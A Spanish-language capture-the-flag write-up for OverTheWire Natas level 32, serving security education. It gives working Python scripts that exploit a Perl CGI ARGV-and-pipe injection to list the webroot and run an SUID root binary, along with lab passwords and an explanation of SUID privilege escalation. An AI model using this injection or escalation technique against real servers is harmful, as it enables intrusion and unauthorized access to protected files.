# Natas 32 → 33

## Información del nivel

| Campo | Valor |
|---|---|
| URL | http://natas32.natas.labs.overthewire.org |
| Usuario | natas32 |
| Contraseña | NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B |
| Contraseña obtenida | 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ |

---

## Reconocimiento

La página presenta la misma herramienta CSV2HTML que natas31. La única diferencia es la pista:

> "This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute."

Hay un binario en el webroot que debemos ejecutar para obtener la contraseña.

---

## Análisis del código fuente

El código es **idéntico** al de natas31 — misma vulnerabilidad de Perl con ARGV y `<>`:

```perl
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    while (<$file>) {
        ...
    }
}
```

La técnica de explotación es la misma — solo cambia el objetivo.

---

## Estrategia

Dos pasos:

1. **Listar el webroot** para encontrar el binario
2. **Ejecutar el binario** con la misma técnica de RCE

---

## Paso 1: Listar el webroot

```python
import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas32.natas.labs.overthewire.org/index.pl?ls -la /var/www/natas/natas32/ | xargs echo |'
auth = HTTPBasicAuth('natas32', 'NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B')

data = {'file': 'ARGV'}
files = {'file': ('dummy.csv', 'a,b,c\n1,2,3')}

r = requests.post(url, auth=auth, data=data, files=files)
print(r.text)
```

### Output relevante

```
-rwsrwx--- 1 root natas32 16096 getpassword
```

El binario `getpassword` tiene permisos **SUID** (la `s` en `-rwsrwx---`) y el dueño es **root**. Cuando cualquier usuario lo ejecuta, corre con permisos de root.

---

## ¿Qué es SUID?

SUID (Set User ID) es un permiso especial en Linux. Normalmente cuando ejecutas un programa, corre con **tus** permisos. Con SUID, el programa corre con los permisos del **dueño del archivo**.

```
-rwsrwx--- 1 root natas32  ← s indica SUID, dueño root
```

Cuando `natas32` ejecuta este binario, corre como **root** porque root es el dueño.

---

## ¿Por qué el binario y no `cat` directamente?

`cat /etc/natas_webpass/natas33` ejecutado vía RCE corre como **natas32** — no tiene permisos para leer la contraseña de natas33 (que solo root y natas33 pueden leer).

`getpassword` con SUID + dueño root corre como **root** — puede leer cualquier archivo del sistema, incluyendo las contraseñas.

### Importante: el binario hace lo que está programado

SUID solo cambia con qué privilegios se ejecuta, no qué ejecuta. `getpassword` está diseñado específicamente para leer e imprimir la contraseña. Si fuera otro binario (como `whoami`), el SUID + root no ayudaría a obtener la contraseña.

---

## Paso 2: Ejecutar el binario

```python
url = 'http://natas32.natas.labs.overthewire.org/index.pl?/var/www/natas/natas32/getpassword |'
```

```python
import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas32.natas.labs.overthewire.org/index.pl?/var/www/natas/natas32/getpassword |'
auth = HTTPBasicAuth('natas32', 'NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B')

data = {'file': 'ARGV'}
files = {'file': ('dummy.csv', 'a,b,c\n1,2,3')}

r = requests.post(url, auth=auth, data=data, files=files)
print(r.text)
```

La contraseña aparece en el `<th>` de la tabla.

---

## Comparación con natas31

| Aspecto | natas31 | natas32 |
|---|---|---|
| Vulnerabilidad | Perl ARGV + pipe | Perl ARGV + pipe |
| Técnica | Idéntica | Idéntica |
| Comando final | `cat /etc/natas_webpass/natas32 \|` | `/var/www/natas/natas32/getpassword \|` |
| Privilegios necesarios | natas32 puede leer natas32 | SUID root para leer natas33 |

natas32 es un nivel de **escalada de privilegios** sobre la misma vulnerabilidad de natas31. Demuestra que la vulnerabilidad de RCE se puede combinar con binarios SUID para escalar privilegios.

---

## Conceptos clave

- **SUID (Set User ID)**: permiso especial que hace que un binario se ejecute con los permisos del dueño en lugar del usuario que lo ejecuta. Identificado por la `s` en `-rwsrwx---`.
- **Privilege escalation con SUID**: técnica clásica para escalar privilegios. Si encuentras un binario SUID con dueño root que ejecuta comandos arbitrarios o lee archivos, puedes obtener acceso root.
- **RCE + SUID**: combinación poderosa — RCE te da ejecución de código como usuario web, SUID + binario root te da acceso a archivos protegidos.
- **`xargs echo`**: formatea el output en una línea, útil cuando el código procesador (como CSV) no maneja bien múltiples líneas.
- **Webroot**: directorio donde el servidor web sirve los archivos. En este caso `/var/www/natas/natas32/`.
